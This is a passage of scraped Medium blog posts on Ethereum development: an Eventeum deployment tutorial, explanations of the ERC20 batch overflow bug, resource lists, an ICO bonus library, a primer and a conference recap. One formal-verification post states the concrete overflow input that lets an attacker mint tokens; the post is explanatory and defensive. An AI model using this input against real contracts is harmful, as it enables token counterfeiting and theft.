trading advice, always do your own independent research.If you like the Blog then please help support the publication viahttps://www.patreon.com/cryptbytestech. Also you can send some eth contributions to 0x670A8721C343Ce16D619630283Ea70F3235e3247If you have a story please join the telegram channels and share with us Joinhttps://t.me/joinchat/AsCHKQ8-wkEQYo5BXDQgZQ.If you want to explore more on Cryptos visit -> https://cryptoprofile.comSolidified - Audit Platform for Smart ContractsA platform for crowd-sourced review of smart contracts, where any developer can bring their contract for review with a\u2026www.solidified.ioTurnkey ICO SecurityFull Spectrum ICO Protectionwww.iosiro.com", "responses": "2"}, {"title": "Ethereum Events monitoring using\u00a0Eventeum", "author_name": "Gaurav Agrawal", "link": "https://medium.com/quiknode/ethereum-events-monitoring-using-eventeum-f81695d92e05?source=search_post", "post_date": "Jan 3", "readtime": "5 min read", "upvotes": "70", "content": "Ethereum Events monitoring using\u00a0EventeumSmart contract monitoring made simple and\u00a0scalableGaurav AgrawalBlockedUnblockFollowFollowingJan 3Photo by Gian D. on\u00a0UnsplashEvent tracking on Ethereum can be very painful when you are building a Scalable Dapp. Today we are going to look at Eventeum, developed by Kauri Team.What is Eventeum?Eventeum is an Ethereum event listener service that provides a bridge between your smart contracts and middleware layer. Events subscriptions can be registered dynamically, and on emission, a message containing the details of the events are broadcast onto a message bus (currently either Kafka or RabbitMQ) which can then be consumed by your backend services.Eventeum is:Dynamically Configurable\u200a\u2014\u200aEventeum exposes a REST api so that smart contract events can be dynamically subscribed / unsubscribed.Highly Available\u200a\u2014\u200aEventeum instances communicate with each other to ensure that every instance is subscribed to the same collection of smart contract events.Resilient\u200a\u2014\u200aNode failures are detected and event subscriptions will continue from the failure block once the node comes back online.Fork Tolerance\u200a\u2014\u200aEventeum can be configured to wait a certain amount of blocks before an event is considered \u2018Confirmed\u2019. If a fork occurs during this time, a message is broadcast to the network, allowing your services to react to the forked/removed event.[source]Deploying EventeumEventeum supports 3 broadcast mechanisms.KafkaHTTP PostRabbitMQWe will be using Kafka in our deployment.To deploy Eventeum, you need these things:PrerequisiteJava8MavenMongoKafkaZookeeperEthereum NodeDocker (optional)You can deploy Eventeum with or without docker. To get started I\u2019ll recommend docker all-in-one installation. It comes with all the dependencies mentioned above, though you still need to install Java8 and Maven (so install these first). I have installed both versions, with and without docker, but will mention docker all-in-one installation only as it is easy and you don\u2019t need a lot of setups.Installing Eventeum using DockerTo install Eventeum using Docker, you must have Docker and Docker-compose in your system. After installing them, follow below instructionsCheckout Eventeum Github Repo$ git clone https://github.com/ConsenSys/eventeum.gitAfter checking out the code, navigate to the root directory$ cd /path/to/eventeum/Compile, test and package the project$ mvn clean packageAll-in-one docker installation$ cd server$ docker-compose -f docker-compose.yml build$ docker-compose -f docker-compose.yml upOnce installed you can see logs in docker terminal.Note: You might need sudo depending on your docker installation.Testing EventeumFor this purpose, we will deploy a contract on our local parity node (already installed by Eventeum) and then will register an event subscription on Eventeum for Broadcasting via Kafka.Deploy contract on Local Parity nodeLet\u2019s Deploy a contract we already made in our previous tutorial. To deploy CrudApp.sol contract we will use Remix IDE and Metamask.Open Remix and add CurdApp.sol contractSelect proper compiler (0.4.23 in our case) and compile (Ignore warnings, if any \ud83d\ude03)On Metamask Select Localhost:8545In Remix, Go to Run Tab and select Web3 Provider in Environment and DeployThat\u2019s it you deployed the contract on your local Parity dev node.Register EventWe need to now Register events, so Eventeum can listen to those events and broadcast them. Eventeum exposes rest APIs for this purpose, we will use them.Register events API-URL: /api/rest/v1/event-filterMethod: POST{\t\"id\": \"event-identifier\",\t\"contractAddress\": \"0x1fbBeeE6eC2B7B095fE3c5A572551b1e260Af4d2\",\t\"eventSpecification\": {\t\t\"eventName\": \"TestEvent\",\t\t\"indexedParameterDefinitions\": [\t\t  {\"position\": 0, \"type\": \"UINT256\"},\t\t  {\"position\": 1, \"type\": \"ADDRESS\"}],\t\t\"nonIndexedParameterDefinitions\": [\t\t  {\"position\": 2, \"type\": \"BYTES32\"},\t\t  {\"position\": 3, \"type\": \"STRING\"}] },\t\"correlationIdStrategy\": {\t\t\"type\": \"NON_INDEXED_PARAMETER\",\t\t\"parameterIndex\": 0 }}To make our life simple, we will simply do a curl call. As you can see below, we are using localhost:8060 (on which, Eventeum is running) and you need to add the address for your deployed smart contract from Remix. We are currently registering CountryEvent from our smart contract which gets emitted on insert transaction.curl -X POST \\http://localhost:8060/api/rest/v1/event-filter \\-H 'Cache-Control: no-cache' \\-H 'Content-Type: application/json' \\-H 'Postman-Token: 616712a3-bf11-bbf5-b4ac-b82835779d51' \\-d '{\"id\": \"Country\",\"contractAddress\": \"ENTER_YOUR_CONTRACT_ADDRESS_CHECK_IN_REMIX\",\"eventSpecification\": {  \"eventName\": \"CountryEvent\",  \"nonIndexedParameterDefinitions\": [    {\"position\": 0, \"type\": \"STRING\"},    {\"position\": 1, \"type\": \"STRING\"},    {\"position\": 2, \"type\": \"UINT256\"}] }}'If registered successfully, you will get your ID (Country in our case) back as a response. Now Let\u2019s do an insert transaction which will emit our CountryEvent. For this purpose, we\u2019ll use Remix again, using remix, you can call your contract functions.You can see our CrudApp.sol contract address and also functions exposed by the contract, you can call it from here\u00a0only.So Now, Let\u2019s put these 3 things in insert function (\u201cUSA\u201d, \u201cElizabeth Warren \u201d, 327946410), if everything went well, you will be able to see the transaction in Docker terminal.Subscribing Eventeum events in NodeJs\u00a0serviceNow let\u2019s subscribe Kafka events using a NodeJs service. This will help you to a clear picture about how you can use Eventeum with your application. For this follow these steps.mkdir watchercd watchernpm initnpm installnpm i kafka-node  (Kafka-nodejs client)touch index.jsNow add below code in index.jsvar kafka = require('kafka-node')const client = new kafka.KafkaClient({kafkaHost: 'localhost:9092'});var kafka = require('kafka-node'),    Consumer = kafka.Consumer,    // client = new kafka.Client(),    consumer = new Consumer(        client,        [            { topic: 'contract-events', partition: 0 }        ],        {            autoCommit: false        }    );consumer.on('message', function (message) {    console.log(message);});You can run this usingnodejs index.jsTo test this, again do an insert transaction using remix and you will able to see console output for the event.As you can see we are using the topic as \u2018contract-events\u2019, this is already inbuilt in Eventeum, to check all the topics defined by Eventeum.bin/kafka-topics.sh --list --zookeeper localhost:2181As you are using docker installation you need to go inside the docker and run the above command, though you need to change the /bin/kafka-topics.sh with actual installation path in docker. Eventeum already create below topics__consumer_offsetsblock-eventscontract-eventsfilter-eventsfilter-events-dlteventeumfilter-events-erreventeumfilter-eventsnullHere block-events track new block generations.You can see more details here about Eventeum and learn more about it.How to Use Eventeum on TestNet or\u00a0MainNet?To use Eventeum with Testnet or Mainnet you need to change Ethereum node URL in docker-compose.yml.As I am facing problem with Infura\u2019s eth_newBlockFilter api used by Eventeum, you can use QuikNode for this purpose.QuikNode provides fast Ethereum nodes, combined with Eventeum you can monitor smart contract events reliably.Please take 5 minutes to fill below this Ethereum Node Survey \ud83d\ude4f\u00a0\ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. We already worked with hundreds of companies to help them scale their Dapps and provide highly reliable Ethereum nodes. We are working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": ""}, {"title": "The Batch Overflow Bug, and Why Your Trustcoins and WeTrust Financial dApps Are\u00a0Safe", "author_name": "WeTrustLeonD", "link": "https://blog.wetrust.io/the-batch-overflow-bug-and-why-your-trustcoins-and-wetrust-financial-dapps-are-safe-2e8af266e3fa?source=search_post", "post_date": "Apr 30, 2018", "readtime": "3 min read", "upvotes": "206", "content": "The Batch Overflow Bug, and Why Your Trustcoins and WeTrust Financial dApps Are\u00a0SafeWeTrustLeonDBlockedUnblockFollowFollowingApr 30, 2018Recently, a Batch Overflow bug affecting ERC20 tokens has shut down trading on many cryptocurrency exchanges. Rest assured that your TRST tokens and financial dApps are not affected by this bug. Read on for a brief overview of this pesky bug, and why it doesn\u2019t affect WeTrust\u2019s products.The Batch Overflow bug occurs due to a Batch Transfer function call that is not part of the original ERC20 standard. The function in question performs a multiply that is able to overflow 256 bits, the maximum allowed value in an ERC20 token. Essentially, Ethereum allows developers to track up to (2\u00b2\u2075\u2076-1) values. That\u2019s a value larger than the number 1 with 77 zeros following it! However, certain calculations can result in a value greater than the maximum allowed value. At that point, the Ethereum computer responds by dropping the largest digit and keeping only the lower digits.As an example, imagine you have a computer that only allows you to have numbers up to five digits (i.e. up to 99,999). Say you are trying to multiply two of them:510x300\u2014\u200a\u2014\u200a\u2014 \u2014153,000The result of the multiplication is the number 153,000, but we just said our computer can only handle numbers up to five digits. That means the sixth digit, the 1, gets dropped, leaving us with 53,000. Imagine the same thing happening with binary values (that is, numbers represented using only 0\u2019s or 1\u2019s) that can be up to 256 bits long, and you see how ERC20 tokens can overflow and behave in unintended ways.To prevent these overflow situations from occuring, developers often use the Solidity safeMath library, provided as an open source library by OpenZeppelin. safeMath checks to make sure that the result of any calculation is correct and that no overflow has occurred. It does this by dividing the result of any multiplication by one of the original multipliers, by making sure the result of any addition is larger than the original values, and by checking that no negative numbers can result from a subtraction.In the case of the Batch Overflow bug, a piece of code multiplied two numbers without using safeMath to check the correctness of the multiplication. The code was intended to allow a Batch Transfer, in which a certain amount of tokens can be transferred to multiple wallets with a single transaction, saving gas in the process. The code seems to have been copied and pasted by multiple developers, exposing a variety of tokens to the bug. In this case, the overflow can allow an unscrupulous person to create additional instances of the affected tokens \u201cout of thin air\u201d, allowing them to counterfeit the buggy tokens.WeTrust\u2019s TRST tokens and Trusted Lending Circles are NOT affected by this bug. Our hardworking software development team takes security very seriously, and has made sure that both our tokens and the products powered by them are not susceptible to these type of hacks.Our users are protected from this bug because:TRST is an ERC20 token, but DOES NOT implement the non-standard Batch Transfer function that causes this bug.We do not perform any multiply that can lead to overflows in our transfer functions. In fact, we don\u2019t perform any multiplies in our token code at all! All of the token transactions occur as additions.In our Trusted Lending Circles Smart Contract, we always validate the results of our calculations with the same safeMath assertions. If the result is false, the Smart Contract will throw an error.Our Smart Contracts have all been independently audited by security firms, including Quantstamp, ABDK, and OpenZeppelin, the creators of the safeMath library.When implemented the right way, blockchain technology is highly secure and incredibly difficult to hack. However, writing secure code on the blockchain requires a great deal of care and discipline. Bugs such as Batch Overflow emphasize the importance of taking proactive measures to keep decentralized applications safe.As the blockchain ecosystem matures, we expect to see the emergence of more tools, techniques and best practices for security. Keeping our Smart Contracts safe requires extra work from our software developers and our outside auditors, but it\u2019s absolutely worth it to create products that our customers can completely TRUST.", "responses": ""}, {"title": "Awesome Ethereum Resource\u00a0Lists", "author_name": "Gaurav Agrawal", "link": "https://medium.com/quiknode/awesome-ethereum-resource-lists-dd28a9c17fc1?source=search_post", "post_date": "Jan 24", "readtime": "4 min read", "upvotes": "93", "content": "Awesome Ethereum Resource\u00a0ListsA Metalist of Curations in the Ethereum EcosystemGaurav AgrawalBlockedUnblockFollowFollowingJan 24We have created a list of all the curated resource lists in Ethereum. If you\u2019re looking to learn more about Ethereum, this is a great place to start. Let us know in the comments if we missed anything!\u201cThe blockchain symbolizes a shift in power from the centers to the edges of the networks.\u201d\u200a\u2014\u200aWilliam\u00a0MougayarAwesome CryptoeconomicsCryptoeconomics is a study of understanding economics incentives and disincentives in Cryptosystems. A Cryptosystem is a combination of cryptography, game theory and computer networks to create a decentralized system.Resource list\u200a\u2014\u200aAwesome CryptoeconomicsAwesome CryptographyCryptography the practice and study of techniques for secure communication in the presence of adversaries. [source]Resource list\u200a\u2014\u200aAwesome CryptographyAwesome Crypto\u00a0PapersA curated list of cryptography papers, articles, tutorials, and how-to\u2019s.Awesome Homomorphic EncryptionHomomorphic encryption is a cryptographic method that allows mathematical operations on data to be carried out on ciphertext, instead of on the actual data itself. The ciphertext is an encrypted version of the input data (also called plain text). It is operated on and then decrypted to obtain the desired output. The critical property of homomorphic encryption is that the same output should be obtained from decrypting the operated ciphertext as from simply operating on the initial plain text.[source]Resource list\u200a\u2014\u200aAwesome-HESolidity TutorialsSolidity tutorials videoCoinmonks solidity articles curationEthereum Developer Tools\u00a0ListA guide to available tools, components, patterns, and platforms for developing applications on Ethereum. Curation by ConsenSysResource list\u200a\u2014\u200aDeveloper ToolsBlockchain for Software EngineersResources curated by a full stack software engineer to a blockchain engineer.Resource list\u200a\u2014\u200aBlockchain EngineerEcosystem ResourcesA guide to the available DApps, services, writings, and knowledge bases for learning and understanding the Ethereum ecosystem.Resource list\u200a\u2014\u200aEcosystem ResourcesAwesome SoliditySolidity is the mainstream Ethereum smart contract language. A curated list of awesome Solidity resources, libraries, tools and more.Resource list:Awesome Solidity by Ben KremerAwesome Solidity by BlockchainLabsNZAwesome Ethereum Virtual\u00a0MachineA curated list of resources on the Ethereum Virtual Machine (EVM), which is the virtual machine executed on the Ethereum network.Resource list\u200a\u2014\u200aAwesome Ethereum Virtual MachineAwesome State\u00a0ChannelsState channels are an approach to scale blockchain by moving some of the transactions off-chain.Resource list\u200a\u2014\u200aAwesome State ChannelsA list of protocols for decentralized exchangeA curated list of various Decentralized exchange projects & protocols.Resource list\u200a\u2014\u200aDEX ProtocolsEthereum Token Standards ListA curated list of all token related standards proposed for the Ethereum network.Resource list\u200a\u2014\u200aEthereum Token StandardsAwesome Buggy ERC20\u00a0TokensA collection of vulnerabilities in ERC20 smart contracts with tokens affected.Resource list\u200a\u2014\u200aAwesome Buggy ERC20 TokensAwesome Decentralized FinanceDecentralized finance (#DeFi) is the movement which leverages open-source software and decentralized networks to transform traditional financial products into trust-less and transparent protocols that operate without unnecessary intermediaries. One could envision decentralized finance impacting the financial world the same way that open-source software has changed software products.A curated list of awesome decentralized finance projects, software, and resources.Resource list\u200a\u2014\u200aAwesome Decentralized FinanceAwesome ZeppelinZeppelin builds key infrastructure to develop and operate smart contract systems.Resource list\u200a\u2014\u200aAwesome ZeppelinEthList: The Crowdsourced Ethereum Reading\u00a0ListA crowdsourced Ethereum reading list.Resource list\u200a\u2014\u200aEthereum Reading ListBlockchain PapersA curated list of blockchain-related academic papers. Papers have been peer-reviewed and presented in academic conferences.Resource list\u200a\u2014\u200aBlockchain PapersAwesome Ethereum AnalyticsA curated list of projects around Ethereum analytics.Resource list\u200a\u2014\u200aAwesome Ethereum AnalyticsAwesome EthereumUseful resources for using Ethereum and building things on top of itResource list:Awesome Ethereum by void4Awesome Ethereum by btomashviliAwesome Ethereum\u00a0SecurityA curated list of awesome Ethereum security referencesResource list\u200a\u2014\u200aAwesome Ethereum SecurityEthhubEthHub provides a single source for essential Ethereum information.Resource list\u200a\u2014\u200aEthhub.ioSharding RoadmapEthereum is moving to a Proof-of-Stake system which will also include scaling solutions such as sharding.Roadmap\u200a\u2014\u200aSharding RoadmapDecentralized Apps\u00a0(DApps)A decentralized application runs on the decentralized network with trustless protocols.Resource list:Decentralized Apps (DApps)State of the DApps RegistryDAppRadar RegistrySmart Contract Security Best PracticesA guide to smart contract security best practices.Resource list\u200a\u2014\u200aSmart Contract Best PracticesAwesome Solidity\u00a0PatternAn accomplice to the \u201cSmart Contract Best Practices\u201d above, but with less security\u200a\u2014\u200aand more focus on engineering.Resource list:Awesome-Solidity-PatternsSolidity-PatternsEthereum Formal Verification ToolsResource list:Projects / ToolsEthereum FundsThe Ethereum Community Fund (ECF)ETH PrizeStatus Incubate by Status.imAragon Nest by Aragon0x Ecosystem Acceleration Program by 0xProjectThe Stable Fund by MakerDAOConsenSys VenturesConsenSys LabsGnosis XGnosis Ecosystem FundGitcoin GrantsMissing something? Open a pull request here or comment this post \ud83d\udc47.Please take 5 minutes to fill below Ethereum Node Survey \ud83d\ude4f\u00a0\ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale their Dapps and providing highly reliable Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": ""}, {"title": "Meritocratic ICO Bonus Based on the WINGS Forecast Rating (FR) Reputation Score", "author_name": "WINGS Magazine", "link": "https://blog.wings.ai/meritocratic-ico-bonus-based-on-the-wings-forecast-rating-fr-reputation-score-47d492b4c4f7?source=search_post", "post_date": "May 25, 2018", "readtime": "3 min read", "upvotes": "40", "content": "Meritocratic ICO Bonus Based on the WINGS Forecast Rating (FR) Reputation ScoreWINGS MagazineBlockedUnblockFollowFollowingMay 25, 2018The Goose That Laid The Golden\u00a0EggBased on text and code repo at https://github.com/WingsDao/fr-bonusIntroductionOver the last 5 years since the first ICO, Mastercoin, it has been popular to award discounts or bonuses to ICO participants based on time or volume. Early time participation could be a measure of how socially connected a participant is in the crypto-economy, and volume could be a measure of how lucky the participant was in winning the womb lottery. But Ethereum allows us to do much more especially to level the planing field for people who are in areas of the world that do not allow them to easily connect with the Silicon Valley elites.In this article we introduce a new method of bonus based on what we believe can be used as a proxy for analytical intelligence\u200a\u2014\u200athe ability to forecast sales outcomes.Each forecaster on WINGS has a Forecast Rating (FR) which is a reputation score based on the ability to accurately forecast the sale of tokens or coins in a crowdfunding event, this score can be increasing or decreasing with time based decay and forecasts accuracy. Based on this FR we can give additional bonus to people, who hold have high FR scores.The WINGS FR score hypothetically is a proxy for effort and analytical capability as it is rewarded for from high participation in evaluating ICOs and consistent ability to predict sales outcomes. Simply put it is a key performance metric for ranking personnel or algorithms (we do not assume that all WINGS forecasters are \u201cpeople\u201d) in a decentralized sales forecasting organization.The repo contains explanations on how to give a bonus for such participants, including a library that calculates bonus based on max FR (you can find the current max FR on this community run FR list portal), participant FR and max bonus.To get more details see examples.InstallationRequirements:NodejsTruffleRPC Node (Testrpc/Parity/Get)Installation with NPM:npm install fr-bonusTestsLaunch:USER_STORAGE=0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962  truffle testImportant: Test Example.js won\u2019t work without providing User storage contract address, use default User Storage address on mainnet: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.MigrationsStandard truffle migrations, see details in migrations folder.ExamplesHere we describe how to integrate FRBonus lib into a token sale or ICO contract, making it possible to give bonus based on FR.First add FRBonus library to your smart contracts, let\u2019s do it with npm:npm install fr-bonusOnce installed do an import of FRBonus library and IUserStorage interface into your smart contracts:import \"./IUserStorage.sol\";import \"./FRBonus.sol\";So in our libraries and contracts we now have:FRBonus:getBonus(uint64 _maxFr, uint64 _usrFR, uint256 _maxBonus) public returns (uint256) - Function that returns bonus, based on maximum FR (you can take it from FR list portal), user FR (take from IUserStorage), and max bonus you are ready to provide (in percents, e.g. 1%-100%). Returns bonus in percent.IUserStorage:getFR(address _account) public constant returns(uint64 FR) - Takes user account address and returns FR of this account.Important: IUserStorage interface should be initialize by User Storage address deployed on Ethereum\u2019s mainnet network. The address is: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.Let\u2019s try to add it to our code like so:uint256 public maxFRBonus = 20; // Max bonus we are ready to allocateuint64 public maxFR = 771; // Maximum FR take from FR list portal - https://wings-utilities.com/uint256 bonus = FRBonus.getBonus(maxFR, IUserStorage(userStorage).getFR(msg.sender), maxFRBonus); // take a bonus, will be some percent %.This is how we get the FR of a participant:IUserStorage(userStorage).getFR(msg.sender)userStorage is address and should be: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.That\u2019s all. Now you can use your bonus to increase allocation of tokens for ICO participants based on how how much WINGS FR they have achieved.For more details look at our example contracts.LicenseMIT.", "responses": ""}, {"title": "What is blockchain: A basic\u00a0primer", "author_name": "Matt Burgess", "link": "https://medium.com/@mattburgess/what-is-blockchain-a-basic-primer-775d72b353e5?source=search_post", "post_date": "Oct 7, 2017", "readtime": "10 min read", "upvotes": "29", "content": "What is blockchain: A basic\u00a0primerBitcoins, Ethereum and other blockchain applications seem to be all the rage right now. So what the hell actually is\u00a0it?Matt BurgessBlockedUnblockFollowFollowingOct 7, 2017After I first learned of the Baader-Meinhof effect, I started noticing people mentioning it all the time.Dumb jokes aside, it\u2019s that thing that happens where you hear about something \u2013 an obscure band or a type of wood, or god knows what, and now you hear it all over the place. That can make it hard to tell whether you\u2019re only just now hyper-attuned to any mention of a previously common term, or whether it\u2019s actually becoming a thing.Blockchain is one of them. If you\u2019re anything like me (and if you are, congratulations) you\u2019re hearing about blockchains all over the place. I started doing a little bit of work in that space lately, and it forced me to look into it.What I discovered is a world of relatively simple principles, clouded by assumed knowledge and arcane terminology. Blockchain applications combine all the jargon of IT with the insider knowledge of the finance and trading industry. Add in some advanced cryptography and baby you got a stew going.The point of this article is to penetrate some of that. This is written from a developer and interested party point of view. And actually, let\u2019s make something very clear right up front.This article is not about trading or buying\u00a0BitcoinThis article is actually about the underlying technology, the overlaying terminology, and its applications. It is intended to answer often unasked questions about what blockchain actually means and how it works.Let\u2019s start at the beginning. Fundamentally, a blockchain is no more or less than a ledger, a list of transactions. That list is agreed on by mechanisms to determine consensus, which makes it \u201cofficial\u201d.You see, blockchain technologies are \u201cdistributed\u201d. There\u2019s no central list of transactions. There are a huge number of \u201cledger keepers\u201d on the network, all of whom have equal access to the network and the transactions in it. That means everyone needs to agree on what are the correct transactions, and (most critically) in what order. With a distributed system, transactions can be put into the system in any order and retrieved in any order. This order very much matters.If Joan sends $80 to Steven, and $70 to Chen, but she only has $100 then we have a problem. Whichever one she sent money to first gets paid. Whoever was sent the second doesn\u2019t \u2013 that transaction is invalid. If one person says Jeff got paid first and another says Steven did, there is a conflict.The way it works out is surprisingly simple. Every one of the ledger keepers has access to a pool of pending transactions. They grab whatever transactions they want out of that pool, and make them into a collection up to a certain amount of space and that\u2019s called a Block. See where this is going?From there, every ledger keeper tries to claim their block is the correct block. The official order. But there can be only one and they have to fight for it. The way they fight is where the crypto in cryptocurrencies comes from. (I\u2019ll let you figure out what \u201ccurrencies\u201d means on your own time.)Blockchain cryptography vastly oversimplifiedBecause there can be only one block officially chosen, each ledger keeper has to work for the right to be that one. As a result, they\u2019re asked to do a puzzle. In actual fact they\u2019re asked to solve elliptic curve cryptography, but that\u2019s hard to explain for three reasons: I don\u2019t understand it, I don\u2019t care, you don\u2019t care.A good analog to the puzzles is something like Sudoku. Sudoku follows very simple rules. You can only have the numbers 1 \u2013 9, and they can\u2019t conflict among rows, columns, or 3x3 grid squares. Most critically, solving a Sudoku puzzle is difficult and time-consuming, but confirming that it is solved is a piece of cake. You just scan over it to confirm it didn\u2019t break any rules and it should all be good.Analogically, the ledger keepers don\u2019t \u201csolve\u201d the sudoku by actually figuring it out like you or I would. There\u2019s no puzzling or logic. They just slam numbers into it and hope it\u2019s right. When it\u2019s not, they try more numbers. Over and over until they get one right. With a lot of attempts, by design it takes about 10 minutes for someone to get one right somewhere in the world.", "responses": ""}, {"title": "iExec at The Blockchain Summit in London\u200a\u2014\u200aOctober 31st,\u00a02017", "author_name": "Julien B\u00e9ranger", "link": "https://medium.com/iex-ec/iexec-at-the-blockchain-summit-in-london-october-31st-2017-2f24f7bbf01b?source=search_post", "post_date": "Nov 2, 2017", "readtime": "3 min read", "upvotes": "268", "content": "iExec at The Blockchain Summit in London\u200a\u2014\u200aOctober 31st,\u00a02017Julien B\u00e9rangerBlockedUnblockFollowFollowingNov 2, 2017iExec was at Marketforce\u2019s 3rd Biannual Conference in London on the 31st of October represented by Jean-Charles Cabelguen. The goal of the event was to stay up-to-date with blockchain\u2019s most recent trends in finance.The Blockchain Summit, Marketforce\u2019s 3rd Biannual ConferenceAt the opening, Noelle Acheson, Editorial Producer at Coindesk, recalls that last year\u2019s talks about blockchain were limited to presenting the potential of the technology. Today, the debate on blockchain moved to practical solutions and deployment strategies. iExec is well aware of this shift, and the roadmap of the project is attuned to this need.Afterwards, Vinay Gupta, Founder at hexayurt.capital, delivered the first talk with a sound-titled presentation: \u201cLet\u2019s Save the World and Make a Lot of Money\u201d. He underlined the impact of combining legal work and blockchain to power innovation and deep change.David Harris, from the London Stock exchange, echoed the opening of the summit. From his point of view, blockchain is moving fast from experimentation to enterprise-grade projects.Evgeny Xata, CEO of Cybertrust, focused his talk on blockchain being the 6th wave of the economic development, right after microchips. From his projection, the expected value created from blockchain and artificial intelligence could be worth four times the value created by the microchip revolution.During the conference, three main topics were discussed. For each one of them, six speakers shared either novel concepts or case studies.Digital IdentityTransfer and TradingSmart ContractsThe last panel discussion and questions of the summit were managed by Nikola Tchouparov\u200a\u2014\u200aCEO & Co-Founder at Moneyfold Ltd, Arnaud Le Hors\u200a\u2014\u200aTechnical Lead at Hyperledger, Mark Simpson\u200a\u2014\u200aInnovation Engineering at Royal Bank of Scotland and Anthony Macey\u200a\u2014\u200aead of Blockchain R&D at Barclays.In short, they all predicted that standardisation will come from projects backed by great vision, but also from regulatory initiatives originating from centralized structures. iExec is also following this path by being at the forefront of the ICO movement in France, all while meeting with regulators and media to develop best practices for crypto funding.The rest of the day was perfect to spend time with crypto fans and large corporate companies involved in international development, industrial projects, standardization, and international marketing. A perfect timing for iExec to network and initiate future partnerships off-conference!", "responses": "1"}, {"title": "Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with\u00a0Act", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-3-an-attempt-to-prevent-classic-hack-with-klab-8e8d13318086?source=search_post", "post_date": "Feb 21", "readtime": "4 min read", "upvotes": "278", "content": "Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with\u00a0ActMarek KirejczykBlockedUnblockFollowFollowingFeb 21This is the third post of a series Formal Verification for n00bs:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: A try to prevent classic hack with KLabPart 4: Understanding K languageIn this post, we will try to use KLab to show how a classic hack - Batch overflow could be prevented. We will also explore ACT in more details as well as reach some of its limitations.Reminder:ACT is a fairly simple language provided by KLAB that helps in generating high-level semantics in K. The whole ecosystem is described in part1; some basics on ACT were already described in part2.A tragedy that could be\u00a0avoidedIn the history of Ethereum, there were a few big hacks caused by implementation issues in smart contracts. One of the famous was the one with batch overflow. We want to show that this problem could be avoided if formal verification had been used.The code of the considerate contract is here. The problem is in the following function:The vulnerability is caused by code in line 3, where SafeMath should have been used:The attack for the original code is the following: you can pick a huge _value such that for example (2 * _value) overflows the range of uint256, e.g.\u00a0_value = MAX_INT/2+1This will casue amount to equal 2 and will bypasschecks in line 5, while amount added to receiver in line 9 will be much bigger than amount of all tokens in circulation.Could this bug be noticed earlier? Let\u2019s write high-level intended semantics for the batchTransfer function and check if it is consistent with the actual code.Note: We have to change the interface of the batchTransfer function since at this particular moment dynamic arrays are not yet supported by KLab. So, we will alter solidity code:The announced above high-level semantics for the batchTransfer function is as follows:As an exercise, you can try to check that the above implementation of batchTransfer function fails the proof of consistency with the semantics, however after fixing the bug in line 5\u200a\u2014\u200ait passes.The fixed code is here:Watch out: the proof for the above on my MacBook Air took ~3 hours!ConclusionThis example shows how formal verification could prevent the hack. It also shows the limitations of practical verification with ACT.ACT cheatsheetAs we reached the first limitations of ACT it seems like a good moment to see what is the list of all available headers.In part2 of this series we described the general structure of a specification written in ACT, in particular, three headers: IF, IFF (particularly to express assumptions) and STORAGE. More headers below:SUCH THATThis is used solely to express constraints for statements (S). Let us see an example (special thanks to MrChico from dapphub for this example; all following examples are from official dapphub materials):As you can see the above specifies that a function change behaves in such a way that it modifies two particular positions at the storage (0 and 1 stands for the first two variables of the code of the function) with the constraint that the final values must sum up to the input value x.GASYou can specify accurate usage of your gas:STACKYou can specify direct changes to stack:CALLSYou can specify that an external function is called.RETURNSYou can specify what is returned by your function:BALANCEYou should be able to specify that a balance of a specific address is somehow changed. However, this is not yet available in KLab.Act vs\u00a0KKLab gives a great promise for a solid, reliable tool for formal verification. However, it is a tool on an early stage and there are significant limitations: lack of support for account balance or arrays are two examples. To be able to efficiently obtain a proof of correctness, one has to write Solidity code in a specific manner:All functions should be short and do just one specific thing. If you have a complicated multi-purpose function in your contract, we recommend splitting into a few smaller specialized functions.Calls to unknown code should be avoided.The code should be as simple and straightforward as possible.KLab is an upper layer of a stack of technologies (Details: part1). Directly underneath KLab, there is a language K, in which we can also state our high-level semantics.K is a more expressive language but comes with its own trade-offs:K\u2019s prover outputs just TRUE or FALSE, while KLab\u2019s prover is equipped with a graphical debugger that helps to find a counterexample for a failed proof. (We will cover debugger in a future blog post)Second, to write directly in K, one has to understand accurately EVM (more specifically: KEVM, which description of EVM written in K) which isn\u2019t a piece of cake.So that reality of today\u2019s formal verification of EVM code is that one should understand both ACT and K to be efficient.And so: next time, we will give you a smooth introduction to K!", "responses": "2"}, {"title": "Self-audit, a new bug, and call for community auditing of BlockParty", "author_name": "makoto_inoue", "link": "https://medium.com/noblocknoparty/self-audit-a-new-bug-and-call-for-community-auditing-of-blockparty-e774a8596496?source=search_post", "post_date": "Jul 27, 2018", "readtime": "5 min read", "upvotes": "75", "content": "Self-audit, a new bug, and call for community auditing of BlockPartymakoto_inoueBlockedUnblockFollowFollowingJul 27, 2018Back in June, Josef Jelacic decided to use BlockParty at his UX & Adoption conference in Prague.BlockParty has been my personal pet project over the last two years and I was always the one to deploy and administer the entire process. Josef used BlockParty not only to host his events (pre-conf dinner and spare slots for the unconf event) but he actually deployed the whole smart contract and its frontend all by himself.Hats off to Josef for his bravery but this reminded me of the importance of security. Even though the deposit is small, it still sucks for losing money for bugs.Doing a self-auditSo I decided to audit my own code for a sanity check. You can find the full report of my self-audit here.To begin with, I followed the \u201cHow to prepare for a security audit\u201d guide by Trail of Bits and added all sorts of tools (such as linting and code coverage) to make the environment as clean as possible.It felt good to see apassing green sign and over 98% coverage, though it later came back to bite me\u00a0:-(The next thing I did was to describe the behavior of the smart contract as much as possible. I not only commented all my smart contract source code but also used tools like surya and solgraph to visualise my code.$ surya describe  contracts/Conference.sol  +  Conference (Destructible, GroupAdmin)    - [Pub] <fallback>     - [Ext] registerWithEncryption ($)    - [Ext] register ($)    - [Int] registerInternal     - [Ext] withdraw     - [Pub] totalBalance     - [Pub] isRegistered     - [Pub] isAttended     - 